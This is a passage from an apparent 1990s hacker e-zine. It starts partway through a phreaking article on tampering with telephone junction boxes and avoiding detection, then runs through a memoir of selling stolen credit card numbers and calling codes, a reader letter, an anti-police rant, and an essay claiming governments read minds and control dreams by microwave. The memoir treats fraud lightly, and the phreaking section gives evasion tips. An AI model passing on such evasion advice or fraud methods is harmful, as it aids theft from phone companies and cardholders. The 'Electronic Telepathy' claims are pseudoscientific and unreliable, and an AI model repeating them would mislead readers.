of the door when the box is closed.  That way, if the door is opened the tape
won't be attached anymore.  Then you'll know that someone else has been in it.
If that happens, avoid using that box again.  Most likely it'll be watched.
Plus, anything that you did in the box (altered/modified) will have been changed
back to the way that it originally was.  So, if you connected any boxes to
terminals, Bell would have them all.  The best advice I can give you is to make
sure the box is properly closed and doesn't look like it's been broken into.

Obviously, there are many interesting things that you can do with junction
boxes, such as setting up conferences, scanning ld exchanges, hacking systems,
hacking codes, dialing ld h/p boards etc.  It can be a lot of phun if you have a
laptop and a modem with you.  :)  I'll explain setting up conferences and some
other things that can be done while field phreaking in a future article.

                      THE STORY OF MIDNIGHT SORROW
                      (In case you were wondering)

                  By Mitchel Waas, aka Midnight Sorrow

-------------------------------------------------------------------------------

     One dark, gloomy, and utterly foreboding day back in 1968, a hellish fiend
was born.  Some called him 'Mitch', a truly ridiculous moniker for such a
righteous dude [Sorry.  This text was created shortly after the release of Bill
& Ted's Excellent Adventure and Ferris Bueller's Day Off.  I talked this way.],
but one name, and one name only, stuck in his brain.  MIDNIGHT SORROW.

     At this point, you are surely wondering, what the hell is this guy talking
about?  Well, simply put, here is my story:  [As if you actually gave a fuck.]

-------------------------------------------------------------------------------

     Back in August of 1983, young Midnight Sorrow was a bumbling, drooling,
hopeless dork.  He had no life, no direction, no goals, he was basically the
same as virtually every other high school sophomore.  So he decided, "I am
going to find something good.  Something worthwhile.  Something ILLEGAL!"
[Well, not really, but literary license being what it is...]   So he began
watching all the computer dorks programming, doing schoolwork, and most of all,
playing computer games on the Apple IIe's in the school library.

     "Hmm...this has potential!" thought Midnight to himself.  So, after a good
month or so of acquainting himself with the other computer dweebs, he
insinuated himself in front of one of the Apples.  Disk in drive, he started
playing Hard Hat Mack.  "Wowee, this is great!  Gotta get one of these!  NOW!"

[Note:  The time frame MUST be radically off, here - I remember playing with a
friend's Apple I back in 1980, while I was still at Pioneer Middle School
(Junior high).  Who knows - fourteen metric tons of marijuana and six hundred
and eighty thousand gallons of liquor which I imbibed during my tenure at FSU
can do that to a person.]

     Sprinting home at a most frightful pace, Midnight got home, only to find
his father in a particularly hideously awfully bad mood.  "Dad, dad DAD!  Ya
gotta get me a computer!  Ya gotta!  Cmon pleez!"  "Yeah son, sure, fuck off.
How about a new game for your Atari?"  (Midnight had one of those incredible
marvels of Japanese technology, the Atari 2600.  He thought it was a piece of
shit.)  "No dad, I *GOTTA* get me one of those Apples!  They're too cool!"

     After a good three to four solid hours (well minutes, actually) of
haggling with his father, he convinced him to get him a computer.   On his
birthday.  In July.

     On his birthday, eleven extremely agonizing months later, Midnight Sorrow
and father went off to the nearest Toys R Us  [the computer and technology
haven that it is] to try and find a worthy system.  Midnight Sorrow, being the
slightly spoiled, but highly imaginative young soul that he was, was thinking
along the lines of an Apple IIe, with dual floppy drives, possibly a hard
drive, with around a thousand blank disks for copying.  Mr. Sorrow (Midnight's
father) had something altogether else in mind.  He bought Midnight .... (drum
roll please) a COMMODORE 64!  (with Tape drive yet, not even a disk drive!)

        ....FADE FORWARD A COUPLE SIXTEEN MONTHS....

     It is now November, 1985.  Midnight Sorrow now has a Commodore 64, TWO
1541 disk drives, over four hundred FILLED disks [gosh]; an altogether very
adequate system.  However, he still remained unfulfilled.  Talking with the
other computer folks in school, he came to the conclusion that the Commodore
was the wrong way to go.  Sure, there were pirates all OVER the place, and
there were games for it up the ass.  But it wasn't the greatest.  He needed an
IBM.  But what could he do?  He had no job, no money, and only a miserable $5
a week allowance.  So he suffered with the knowledge that he was fucked,
doomed to use the Commodore 64 until he died of old age. [or got a job,
whichever came first]

        ....FADE FORWARD SEVEN MORE MONTHS....

      Early June, 1986.  Midnight Sorrow now has a Commodore 64, a Commodore
64C, a Commodore 128, two one megabyte disk drives (quite a treat on the
Commodore, since most games were less than 64k), four 1541 disk drives, a 1200
baud modem!!, and around one thousand filled disks.  He was now heavily into
the illegal sector of Commodore use.  He had friends all over the United
States, through which contact was made possible by the use of other people's
MCI, Sprint, and Teltec calling-card access codes.  His entire system was made
possible by the use of other people's MasterCard, Visa, and American Express
numbers.  He was truly enjoying life.  However, he was only weeks from
graduating high school.  His parents expected him to go out of town, attend
Florida State University, get a nice shiny degree [in Molecular Biophysics,
nonetheless], get married, have three or four kids, and die a horribly wealthy
man.  Midnight Sorrow, ever the impetuous youth, said "FUCK THAT!"  So he
decided to go to FSU, become a school hero of dubious notoriety, while at the
same time becoming the disgrace of his family.  (Well, he didn't really plan
it that way, that's just the way it turned out).  "Oh well, I gotta goto
college, I guess I'll bring my computer there, it'll probably help out with my
term papers and everything," innocently thought Midnight Sorrow.

        ....FADE FORWARD THREE MONTHS....

     September, 1986.  Midnight Sorrow is now at FSU.  He has been rather
halfheartedly attending his classes, instead preferring to stay at his dorm
room in Osceola Hall, and party his ass off.  Last month, seeing that the
monthly contribution from his parents was definitely not going to cut it,
Midnight Sorrow decided to make a few extra bucks.  He was now running a highly
profitable, very busy and successfultyping service.  If you are currently
going to college, you will know the extreme number of term papers you have to
write.  One or two a week, many as long as 3000-5000 words.  All typed.  Not
fun, even if you DO know how to type.  Most typing services charge around $2-$4
per typed page.  Midnight charged $1 a page.  His typing service was a bonafide
hit, and everyone was coming to him to get their papers typed.  One fateful
day, a young fratboy came to Midnight's dorm room.  "Hey guy, wussup, hey man,
you got any papers for sale?"  "FUCK YOU! Fuck off!  Get the fuck outta my room
ya stupid piece of shit!  Ya think I wanna get kicked out of school!?"
innocently replied Midnight Sorrow, not even aware of the idea already brewing
in the darkly malevolent depths of his subconscious....

     It may not be very obvious to you, but it [eventually] was to him.  Every
paper he typed, he saved on disk, in case the original paper's owner wanted
another copy or had some changes, or something.  By this point, he had close to
two hundred assorted term papers filed away on disk.  After a week of some very
serious thinking, Midnight Sorrow decided to contact that fratguy and give him
an affirmative answer.

        ....SKIP FORWARD ONE MONTH....

     Midnight Sorrow's room now seems to be the source of some truly extreme
moneymaking.  Stereo and computer equipment everywhere, and a rather large
record and compact disc collection seems to have sprung up out of nowhere.  He
has now decided to quit class, and work at his "JOB" full-time.  He would
still get the occasional person wanting their paper typed, but his largest mode
of moneymaking was from the THER type of student.  The desperate, I'm-about-
to-fail-my-fuckin-class-damnit-I'll-pay-ANYTHING!!!, type of student.  "Sure
buddy, not a problem.  $10 dollars per hundred words."  And of course, a semi-
wealthy, parent-financed student (of which there are MANY at FSU), who's right
on the verge of flunking out of English 101, is often quite willing (and eager)
to shell out $300 for an A-quality term paper (Midnight Sorrow, you see, is
OUTSTANDING in English.  It is far and away his best subject.  Once he'd typed
a paper in, he went in and revised it, correcting grammar and other minutia,
making it pretty damn close to "A" quality.)

     "So, what the hell did this stupid fuck do with all the money?" you are
surely asking yourself.  Well, aside from the extreme quantity of CD's, disks
and electronic equipment he bought for himself, Midnight Sorrow was also the
'PARTY MAN' of Osceola Hall.  He generally found himself the kind benefactor of
many an all-night party, often buying several cases of wine coolers, a few
pizzas, and a keg or two a night.  Midnight Sorrow happily went around in an
extreme drunken stupor for the last three months of his first college semester.
Due to this, his judgment obviously wasn't exactly up to par.  [Gotta love the
foreshadowing, eh?]

        ...SKIP FORWARD TO DECEMBER 10, 1986....

     "Son, do you realize the problems you have caused?  You have sold EIGHT
copies of the EXACT SAME TERM PAPER to students in the same class!  And god
only knows how many other copies of that paper are wandering around campus!
What do you have to say for yourself?!?" angrily queried the Dean of
something-or-other, head of a hastily-convened board regarding this most
devious miscreant, Midnight Sorrow.

     "Uhh, umm, err, well, y'see, umm...", replied Midnight Sorrow rather
eloquently, still hazing-n-dazing around through the depths of a most gigantic
hangover.  Needless to say, they presented him with an ultimatum:  Get the
fuck out of FSU, and never return, and we won't press charges.  He left.

        ...SKIP FORWARD TO CHRISTMAS EVE, 1986...

     Midnight Sorrow's parents still have no inkling of what their delightful
son has been up to for the past four months.  They think that he is on
'Christmas Break,' and will be returning to college in three weeks.  Well,
that's what they thought.  Until today.  See Midnight Sorrow's father, a rather
hulking mass of 265 pounds, all of six foot four, come smashing through the
front door.  "OK you stupid shit, talk to me!" calmly said Midnight's father,
as he cheerfully pinned his son to the wall one foot off the floor.  "How could
you do this to me!  I'm a respected businessman in this town!  You're going to
ruin EVERYTHING!"

     Needless to say, Midnight Sorrow neglected to remember a minor detail:
One of his sisters lives in Tallahassee, the location of FSU.  She and her
husband are both extremely die-hard FSU fanatics, and alumni.  Her husband's
father just happens to be the Dean of the Mathematics department at FSU.
Although he is seventy-two, and he wears a hearing aid, he just happened to be
at a faculty party, when a conversation trickled around about this consummately
evil student who sold countless copies of term papers at FSU, and the
neighboring TCC (Tallahassee Community College, bonehead).  Being the curious
old fuck that he is, he asked for the student's name.  And of course, he then
called his son, his son called his wife, his wife called her father, and her
father came crashing through his own front door, seriously contemplating
murder.

     Due to the extensive rumor-mongering and idle chatter regarding the
incident, a goodly amount of publicity was aroused.  The FSU school paper
printed a front page story relating the entire incident, in extreme, gory
detail.  The local newspaper, the Tallahassee Democrat, picked up this story
and ran a sub-headline on the bottom of page one.

     Then, that rather large news organization, Reuters, picked up the story.
The New York Times, The Miami Herald, th Boston Globe, the San Francisco
Chronicle, and pretty much every major news forum from here to Upper Mongolia
ran a little story about that hideous abortion of society, Midnight Sorrow,
and his devilish deeds at Florida State.  For obvious reasons, the school
board of FSU reneged on their verbal promise not to press charges, and pressed
charges.

     Wrapping up this dandy situation, Midnight Sorrow eventually ended up
having to serve 120 hours of communiy service, by re-shelving books at a local
branch of the Broward County Library.  End of story.  All's well that ends
well, all has been forgotten, so now Midnight Sorrow can live long and prosper,
get a job, get wealthy, get married, have kids, and live happily ever after.

Nope, sorry, not quite.

        ....SLIDE FORWARD ANOTHER SIX MONTHS....

     July, 1987.  Midnight Sorrow has gotten rid of his Commodore 64, and
taken a little defective IBM-PC from his job as a computer repair technician's
assistant [at Inacomp Computer Centers, Broward Boulevard in Plantation, long
since closed down and turned into a Blockbuster Video].  Due to his connections
at work, he was able to purchase a refurbished 330-meg hard drive for around
$150.  He also purchased a rather complete system, enabling him to enter the
crime world of the IBM.  He found this to be quite a bit more fun than the
dweebish lamer community surrounding the Commodore, and thus found himself
operating a highly-illegal BBS called Deth Dunzhen (Pronounced, perhaps
un-obviously, "Death Dungeon."  The reason for the spelling?  Who knows).

     Having just acquired a wonderful set of fifty sparkling credit card
numbers [credit card numbers, sometimes even entire credit HISTORIES, being as
easy to obtain as water in the computer crime scene of the mid-eighties], he
decided to go about attempting to sell them.  He then posted a message,
accessible only to the "Highest Elite" members of his system (typically only
friends and close acquaintances), informing them of this fact.  Unbeknownst to
him, his Co-Sysop was seriously unhappy with Midnight Sorrow's participation in
these highly illegal areas.  Due to this fact, his Co-Sysop then called up
Crimestoppers and told them of Midnight Sorrow's heinously anti-social
activities.  Crimestoppers then notified the Secret Service, who, at that
moment, just happened to be conducting an investigation into the South Florida
computer crime scene.

     Midnight's Co-Sysop then called up his board, downloaded the message, and
gave it to the Secret Service.  One of their agents, at that point, logged onto
the system, saying that SHE heard about the credit cards from the co-sysop, and
was interested in purchasing.  Sticking his entire foot in his mouth, and
showing absolute, complete, blind faith in that traitorous cocksucking bastard,
Midnight agreed to meet her, at a local Burger King, that Saturday. 

     Seeing how seriously hot this girl was, Midnight Sorrow salivaically
overlooked his typical procedure of asking if she was a cop, fed, or a narc,
and simply wondered if he could get into her pants.  Stupid.  He then gave her
ten credit card numbers, selling them for $50 each.  Exceedingly happy that
that scheme worked, Midnight Bonehead then went out and bought a pair of
Vuarnet sunglasses, twenty new CDs, and quite a bit of good computer hardware.

     Two days later, she called him back, saying how great those numbers were,
commenting on how they actually worked.  She said she wanted to order some
major computer equipment, and asked if he knew of any place that took fake card
info without too much of a hassle.  Midnight then said "Sure!" and gave her the
numbers of a few places that he had recently ordered from.

     Then she asked if it was possible to sell her some more numbers, meeting
the next Saturday, at the same Burger King.  Of course, he mindlessly said
"Sure!", thinking to himself that he sure had a live one.  She was probably
thinking the exact same thing.

     Next Saturda, Midnight's parents were out of town, so he figured it'd be
a perfect weekend to smuggle large quantities of cash and computer equipment
into his room.  Once at the appointed "rendezvous", he then told her that he'd
be glad to sell her twenty more credit card numbers, but for $75 each.  She
said no problem, took the numbers, and slapped a pair of handcuffs on his
wrists. Taking out a tape recorder, and laughing at Midnight's splendidly overt
stupidity, she read him his rights.  Making things even more hideous and
embarrassing, two cars slid in on each side of his car, and another pulled in
behind it, totally blocking him in, looking like something out of "Wargames".

He was fucked.

     The feds then ripped Midnight out of his car, slammed him up against the
trunk, and frisked him rather unkindly.  They then unlocked the handcuffs, put
his arms behind his back, and re-locked them [rather tightly] into place.  At
that point, Midnight Sorrow was NOT a happy camper, particularly after they
THREW him into the back of one of their Fed special Crown Victorias.

     The Secret Service agents then took Midnight to their domicile, at which
point he quite happily confessed to his crimes, and "narced" on some of his
enemies in the scene.  They then informed Midnight that they had been keeping
tabs on him ever since his early C-64 days, and knew virtually everything about
him.  To fully complete the young man's impending paranoia, they pulled out a
series of snapshots, seemingly randomly taken from outside of his house.  One,
in particular, showed Midnight Sorrow on crutches, limping his way to his
father's Audi - which had been traded in almost two years ago.  (Spooky, isn't
it?)

     Anyway - Midnight was then unceremoniously thrown into jail.  He called
his parents at the hotel they were vacationingat, and briefly, sobbingly,
outlined the situation.  Midnight was then told that he could damn well rot in
prison, for all he'd put them through.  Understandable, but still frustrating.
After a rather, umm ... probing ... strip search, Midnight was then escorted to
the Fort Lauderdale prison's juvenile holding cell (not the adult cell, though,
sigh of relief), immediately having visions of being brutally raped by a
300-pound brick wall of a black man named Leroy.  As always, reality proved
only SLIGHTLY different.

     Midnight Sorrow hung out with the other "inmates", and chatted with them
for a while.  Most were not much older than he was at the time; the oldest was
around 25.  Of the twelve people in the cell, ten were black, the other two
being a very frightened young Nicaraguan boy awaiting deportation, the other
being myself.  After relating my story, they all seemed quite amused that
whitemeat was busted for some petty computer crime, while most of them were in
for grand theft auto, burglary, etc.

     Later that evening, Midnight Sorrow feasted upon a nice dinner of
meatloaf, string beans, mashed potatoes in gravy, corn bread, and some kind of
sweet roll/pastry kind of thing.  All in all, FAR better than he usually ate at
home (Midnight's mother, you see, is a certified diet fanatic; "sugar-free
fat-free salt-free cholesterol-free" being almost a mantra around the house).
Quite a satisfying meal, all things considered.  Midnight then went to sleep,
woke up the next morning, and just hung around, talking, playing cards,
whatever.  That evening, around 5pm, Mr. Sorrow came and bailed him out.

     Approximately a month later, the trial was scheduled.  Midnight's father
shelled out some cash and hired some super high-powered Miami criminal
attorney.  He talked with the DA, John Frusciante, who now happens to reside
on Fort Lauderdale's high court, and actually tried running for Mayor once or
twice.  (Ain't life amazing?)  Anyway, what it boiled down to was a plea
bargain.  Midnight got called into the judge's chambers, at which point the
judge sternly promised young Midnight that if he EVER saw him in the courthouse
again, awaiting trial, Midnight would pray for a quick death.

     A couple of months later, Midnight Sorrow got off with two years
probation, a prohibition from even TOUCHING a computer for the entirety of
those two years, a rather large fine, and a slap on the wrist warning him
never to do that again.

-------------------------------------------------------------------------------

Addendum Number One:

Looking back on all of that, just judging by the sentencing, I would definitely
do it again.  The only thing preventing me, is the extreme amount of
(emotional) pain I underwent when they confiscated all of my equipment,
leaving me with a pretty much empty room.  (Guilt?  Remorse?  Nah, fuck that.)

And here I am!  My probation ended in October of 1989, and now I'm back (and
legal, fortunately).

P.S.:  They never took the CDs, stereo equipment, or the Vuarnets.

-------------------------------------------------------------------------------

Addendum Number Two:

It is now somewhere over twenty nine months since the time I wrote the original
text.  I'm still in the computer scene, quite a bit more grown up, and dealing
with things quite a bit more maturely (generally).  I no longer phreak, no
longer hack, no longer card, and basically no longer even pirate.  Virtually
my only current computer-related pastime, these days, is running my network,
CyberCrime.  (Funny that the name probably would have been more appropriate
for me during the period outlined in this text, than it is now.)  Anyway...
Some people would call me reformed, others would call me an idiot, while still
others would hail me as a hero (of sorts).  Of course, half of the things I did
back then would be asinine to even consider attempting now, with the advent of
ESS, ANI, caller id, multi-faceted PIN numbers, hack detection, instant credit
card referencing, order call-backs, no "drop-and-run" package deliverers, and
extreme legislation against these various crimes, making the penalties so much
greater now than they were then.  Regardless, I would call myself none of the
above.  I would simply say I grew up.  Then again, my morals have never been
what one would call exemplary; only the thought of the consequences of a crime
is what stops me now.   Regardless.....

I am now 25, the proud owner of a home, a car, and quite happy and successful
at my career.  Still hoping to find a solid relationship, and biding my time.
These days, computers are merely a hobby for me, and not my LIFE.  Trying not
to sound like a pompous, self-absorbed, head-in-the-sand, reactionary prick,
I'd simply like to warn all the "kids" in the scene - stay cool, stay clean -
don't try any bullshit, the penalties are simply not worth it.  True, the price
I paid was low - but it wouldn't be any more - not to mention the permanent
marks those "indiscretions" left on my record.

Welp, I guess that's about it, folks.  Thanks for reading, and thanks for
caring.

(Not so) Final Addendum:

It is now July 8, 1996 - my 28th birthday, a good thirteen years since the
beginning of this story, and just under five years since the end of it.  The
computer BBS scene is all but gone, what with the massive popularity (and low
cost) of the Internet.  Gone with the BBS scene are virtually all major forms
of computer crime, though hacking is still a hobby for many (though the price
runs VERY high in event of a bust).  Even piracy has been significantly
reduced, due to the ubiquity of CD-ROM-based programs (making it so much more
difficult to copy these HUGE programs than it was just ten years ago, where
even a TWO-disc program was rarely seen).  Infinite Darkness was taken down for
good in August of 1995.  CyberCrime was disbanded in February of 1994, and
reformed as InfiNet (The InterNational Freedom of Information Network), which
I personally quit when my board was taken down.  InfiNet actually still exists
to this day, though I no longer have any contact with it.  Gone from my life
are all traces of computer crime - my only remaining infraction being the
occasional bit of piracy.  My life is damn sweet, far better than outlined in
the previous addendum - an excellent career, outstanding social life, material
possessions enough to make even the most wealthy persons whimper in their sleep
- my life is pretty much complete, and losing even the least precious part
would be catastrophic beyond measure - NOW, even the THOUGHT of doing any of
the aforementioned crimes sends uncontrollable spasms up my spine.  Suffice it
to say, I'm reformed.  Today, Midnight Sorrow (the pseudonym) exists only as a
nickname for IRC use, as a link to the glory days of yesteryear - as many of my
fellow "oldsters" are encountered while haunting the endless halls of the
Internet.  Midnight Sorrow (the person) ceased to exist, in reality, shortly
after my father passed away, in June of 1994, and now only exists in memories.
Mitchel Waas is who I am, and I'm damn proud of that fact, and of the name, and
everything for which it stands for.

Thus ends the saga of Midnight Sorrow.

lateron... for all eternity.

Yep!  It's another Addendum:

'Round and 'round she goes, where she stops, NOBODY knows...

Boy, these wheels just keep spinning around and around.  I guess the old adage
is true, "the more things change, the more they stay the same."  It's now
October 18th, 1997, just over a year since the last addendum was written, and
boy have things changed.  Well, somewhat.

Infinite Darkness is back online (at 954-797-0666, NICE phone number, eh?),
strangely enough, and is busier NOW than it EVER was.  No joke.  With six
dialin lines, it's averaging between 40 and 60 callers a day, and is enjoying
FAR more activity than any prior bbs I've ever run.  This BBS is more highly
satisfying NOW than it has ever before been.  I suppose, due to the major
popularity of the internet, there has come about some sort of backlash against
it, causing a major (well, not MAJOR, but certainly a not insignificant)
revival of the whole BBS scene.  As I said before, InfiNet is still around,
and I'm now a part of that (if only a member), as well as several dozen other
message networks, most of which are doing quite well.  I've also restarted
CyberCrime, which is going nowhere fast, due to a severe lack of time to work
on it.  But I'm here, and going nowhere.  This has turned into one HIGHLY
enjoyable and fulfilling hobby.

And yes, I'm back into software piracy, bigger now than ever before, and
getting busted is now a major focus on my mind, what with the massive bust of
all the Razor boards at the beginning of this year.  Fortunately, I have no
serious scene affiliations, don't make a penny from the bbs users, and am not
connected to the internet (yet), so my worries are few.

Aside from that, things are pretty much still the same.  Midnight Sorrow IS
back, but I'm still basically the same old (and getting older) Mitchel Waas
you've read about in this nifty little (little?) story.  I'm 29 years old now,
turning 30 in another nine months (scary!), and basically eke out my existence
through my BBS and my computer tech support business, which turns a fair
profit, nothing spectacular, but certainly enough to live a comfortable life.

So, I guess that about covers the current situation.  I wonder what things will
be like a year from NOW?  You spin me round round baby round round like a
record baby round round round round... or something like that.  :)

I like what you've done to the web.  The FAQ, the separated page links.  Nice
smaller appearance not so bunched up.   I see your considering moving the site.
Well at least you finally got Damage Inc off the ground and into the Internet
scene.  Be interesting to see what happens with Damage Inc in 5 years when your
documents have gotten around the world a few times.   That's what always
attracted me to Damage Inc the truth, honesty and information.  I believe
information is power and the truth should be told.   Otherwise we're blind, and
walk around with a bullseye on our ass waiting to be shot at with corruption and
greed.

By the way if you do move the site you can still just create a "We've moved"
(with a hyperlink) web page from the current one and it'll always remain
there.   That will keep the people informed.

-------------------------------------------------------------------------------

Editor - Hey Dave.  I can't take credit for what's been done to the web,
         (www or www2) since I'm responsible for neither.  If however you
         were referring to the Damage, INC. web site, the majority of the
         work that's gone into that has been done by Shatazar.  Therefore,
         I won't take credit for that either.  I wrote the Damage, INC. FAQ
         though, so perhaps I deserve a measure of credit for that.  ;)

         We are considering getting our own top level domain in the future.
         So, yes, the site's URL would change if/when that occurs...although
         at this moment I don't know when that change will take effect.  As
         for what Damage, INC. is about...I believe the things you mentioned
         above are what repel the zombies away in utter disgust.  Their own
         ignorance prevents them from accepting truth, honesty and analyzing
         information that's presented to them.  It's unfortunate, illogical
         and sad...but it's true.  You can show a blind man the way, answer
         his questions and give him solutions to his problems.  In the end
         though, they may not want to see the truth that's been proven and
         shown to them.  I've realized that it's something that cannot be
         forced upon anyone.  Your bullseye analogy works and expresses almost
         the same point.

         You can be assured that we'll inform everyone if the site moves...
         and a hypertext link to it would be added to the existing web site.


OBJECTIVE OPINIONS -                                             {OPINIONS}
Cops and Harassment.

    Have you ever watched the television shows COPS, Top Cops or To Serve and
Protect?  They depict police officers that are in the process of busting people.
Cops sure seem to get a lot of TV coverage.  Those shows make people think that
all the cops are good and worth the money that they are paid.  However, do
they ever show cops that are using unnecessary force?  As in, how many times
have you seen television footage of cops beating the fuck out of someone?
There have been numerous times when that has happened and the media hasn't shown
any coverage of it, nor have they mentioned those occurrences.  There are many
instances of cops using excessive force while in the process of trying to arrest
a "suspect".

    Once, I saw a white guy who was beaten by a cop until he could no longer
see.  It happened near a Canadian/American border while my parents and I were
there visiting some relatives.  They asked me to go to the corner store and buy
some things for them.  So, I said "Sure" and after getting proper direction I
was on my way.  I was only about 11 years old at the time of this event.  While
I was walking down the sidewalk, a cop pushed me out of the way as he was
chasing a guy.  The person that the cop was chasing tripped on a curb and fell
to the ground.  As soon as the cop was near him, he took out his night stick
and began hitting the man multiple times in the face.  He continued striking
him until he was knocked out.  It was a sick sight to see at that young age.
The cop just looked over at me and waved for me to get going.  He probably hoped
that I wouldn't say anything, or testify against him regarding what I'd
witnessed.  That cop wasn't even charged for what he had done.  All the guy
he was chasing after did was shoplift and attempt to escape.  Did he really
deserve to be assaulted for that petty crime?

    Most cops can barely even run, let alone catch anyone.  Most of them have
had one too many doughnuts. ;)  One night, I was at a bush party at a place
called Bass Lake.  I'd estimate that 100 or more people were there.  Almost
everyone was underage, and under the influence of drugs or alcohol.  They had a
huge fire going.  Everyone was just standing around drinking, talking etc. until
about twenty cop cars and two fire trucks came racing into the forest.  Everyone
started to run away, as there must have been about thirty to forty police
officers running around trying to catch people.  I was only chased for a short
distance because the cop lost his breath and stopped for gasps of air.  As I
looked back at him, I saw that he had his night stick in his hands and he was
bent over trying to catch his breath.  I just laughed (since we had only been
running for about forty seconds).  Later that night I heard that out of the
100 people that were there, one person got caught because he had passed out
from all the drinking that he had done.  He was 19 (legal drinking age in
Canada) so they couldn't do much to him.  I talked with him a couple weeks
later to see what the cops asked him, and he said they wanted to know names
of people that were there, why he was there, who he went with, how many
people attended, if it was planned or just a hangout kinda place, who started 
the fire and if he saw anyone doing drugs.  That just proves how good our cops
are.  Do they show that on TV?  Approximately forty police officers can only
catch one person that was already passed out and could not move?  Out of 100
people, most of which were pissed at the time, the cops were sober and they
couldn't even catch one person that was running.

    Cops also like harassing people when they are doing nothing against the
law.  They always target the areas that teenagers are at.  For example, one
night I was downtown at about 11:50pm or so waiting for a friend and a cop van
pulled off the street and rolled down the window.  He asked me if I knew what
time it was, what I was doing out so "late", what my name was.  Then he looked
it up in the computer to make sure that I didn't have a criminal record etc.
He had no right to embarrass me like that, since there are no laws in this
area as to what time someone can be outside at night.  There is no curfew for
teenagers in the city that I live in.  To him it's just a power trip though.
He thinks that he is the boss and can tell people what time they can be outside
at and when it's safe and not safe to be downtown.  In my opinion, it's our
choice to decide whether or not it's safe to be where you want.

    Another thing that pissed me off was when we got caught with about two and
a half grams of hash by a few police officers on off-road dirt bikes.  I went
to the school with a few friends to smoke some hash, and just as we were getting
ready to leave, ten cops on dirt bikes came racing up.  They started talking
to us, asking us questions like why we had a bottle in our hands, what our names
were, etc.  He then started to threaten us, saying if we didn't hand over the
"drugs" they would take us in and arrest us.  Finally, my friend, who was
holding it gave the hash to the cops, and they all looked at each other and
sort of smiled.  The one guy on the bike said "You are lucky that we are not
going to take you in for this."  He said that they have been scouting the area
like a hawk this week and we are the only people that they have found smoking
drugs.  Then they took off on their bikes.  It didn't hit me until later that
night, that these fuckers where probably going to smoke our shit.  Otherwise,
why would they just let us go?  The crooked smiles they gave as my friend handed over
the hash to them really made me think that they were going to smoke it.  They
were abusing their so-called fucking powers.  They think that they are so big
and tough when they have their little gay blue uniforms on.  Meanwhile, they
need night sticks, guns, gases, etc.

    Why don't cops start doing their jobs rather then harassing people, taking
their drugs to smoke for personal use?  Why don't they just spend that time
trying to catch real criminals such as serial killers, instead of wasting
their time pulling over teenagers asking them questions about where they should
be?  Also, they should train more often and eat fewer doughnuts.  Do you still
think that cops are worth every penny of your tax dollars?  The average cop
makes about $46,500 a year.

    Cops are lazy and often try to take the "easy route", rather then doing
their jobs and actually trying to solve crimes.  This last winter my neighbour
went away to Florida, as she usually does.  She left us to watch her house
(take her mail inside and snow plow the driveway).  On a Saturday, I decided to
go over and take her mail inside.  First, I went over to the side door and it
was half-way open, but I thought it was just the door because sometimes it
doesn't close properly.  I went through the door and you have to unlock another
door to get into the house.  It was locked, so I unlocked it and went in.  I saw
the pile of mail first that was scattered across the floor.  I immediately knew
that something was wrong because I had kept the mail in a neat pile.  I remember
thinking that someone was still in the house because of a noise that came from
upstairs.  I looked into the bedroom on the right and noticed the bed was
flipped over, all cut up, and the contents of some drawers were scattered on the
floor.  All of the lights were smashed in that room (the desk lamps and the main
light).  I decided to go upstairs to see if anyone was still in the house.  I
checked every room and things were everywhere, but didn't see anyone in the
house.  I then went back downstairs to find a phone so that I could report what
had happened.  There was also a whiskey bottle on the floor in plain view and
the fan was turned on.  It looked as though the intruder(s) had been inside of
the house for a while.

    I called the cops from inside of the house, and when they arrived they told
me to leave so they could check things out.  About half an hour later the cops
rang my doorbell and started questioning me!  They said things like "May we
please see your shoes?" and they took my fingerprints.  The shoes I was wearing
matched the shoe marks they found on the carpet.  They showed me the shoe marks
(which were *very* fresh and still wet), compared them to my shoes, and started
harassing me with questions like "Were you involved in any way with this
break-in?" and "How did your shoe marks get inside then?"  I was ready to go
ape shit on them.  I fucking told them everything that I did.  I explained how
I went inside to take in the mail and noticed that someone had been in there.
Why couldn't they figure out how my fucking shoe marks got in the house?   Haha.
Then they started to ask me smart-assed questions like "How would someone get
in?  All the windows are boarded up, none were smashed, the doors were locked,
and you were the only one they left with a key."  I replied with these *exact*
words:  "How the fuck should I know?  That's not my job to figure out."  Then
the cop started saying shit like "It'd be a lot easier for both of us if you
would just cooperate."  I was being accused of something I never did.  They
were making it sound like I was guilty.  What did they want me to do?  He told
me to go with him into the house.  So, I went with him and *EVERY* cop in the
house was looking at me.  I couldn't take it anymore.  I told them to leave me
alone, unless they were going to charge me and then I left.  They never did
return to my house.  ;)

    After that, I still had to take my neighbour's mail in and snow plow.
About a week later, as I was about to open the door I glanced down at the lock
and noticed some pry marks on both doors.  I shook my head and thought how the
fuck could the cops miss that!?  They were just trying to take the easy way out
by immediately blaming me, instead of doing all of the necessary work for an
investigation.

                     Electronic Telepathy

   One of the more recent tools of oppression to have made
its emergence in the evolving techno-nightmare scenario is
Electronic Telepathy or "ET"

1. It is no longer necessary to have electrodes attached to
monitor a persons brain wave activity, it can be done remotely.

2. Computer encoding has broken down the signals so they can
now output what it is a person is thinking.

3. A persons subconscious life can be overridden by externally
induced dreams.

Only a total revolution in thinking can prepare one for the
staggering implications and realities of this bold
usurpation of the Newtonian order.

In addition to being able to 'read your conscious thought'
the state of the art now allows for interactive dream
invasion and total control over its content.

"ET" has realized the ambition for the establishment of a
"neo-voodoo" ordered culture where TV commercials, qued by
computer, can and are being used as negative feedback to
privately held thoughts of select targeted individuals when
they're not being used to assuage the cherished notions of
the collective masses, most of them being negative.  The
media are in collusion with this up to their eye balls.
It's not just for entertainment anymore not that it ever was.

Negative feedback/reinforcement to ones private thoughts,
images or urges in the form of microwave verisimilitudes is
also another tactic.  Inducing stress, nervousness or distortion
(signs commonly interpreted as indicating guilt, lying or
uncertainty) in ones voice or demeanour to coincide with the
uttering of select "buzz words" is a common example of this.

The criminal and political possibilities, which in this 'brave
new world' are almost synonymous, are endless and no doubt are
being exploited as well.

The pop culture has not been ignorant of this new reality and
accordingly has incorporated elements of it into the
'collective psyche.'

Movies such as "Foxfire," "Brainstorm," "The Golden Child,"
"Steel Justice," "Desert Passion," "The Sorcerers," "Total
Recall," "Hellraiser III:," "Casino Royale," "Making Mr. Right,"
"Megaville," "No Escape," "In the belly of the Dragon,"
"Batman Forever" and MTV's "Dead @ 21" all draw on elements
of Electronic Telepathy.  There are many others. Reference to
"ET" can be found in tunes like: "Welcome to the Machine,"
"The Dream Police," "Thinking around corners," "West of the
Fields" and "Kiss me when I get back."

The marriage of Science and Voodoo, in pursuit of the Clerical
agenda, has spawned a psychopathic covert, extra-legal industry
who's only function is murder by number, madness and chaos.

Individuals can be put under with microwave for almost
indefinite periods of time while the psyche is raped/programmed
by "ET" dreams and don't think that they're putting 'good
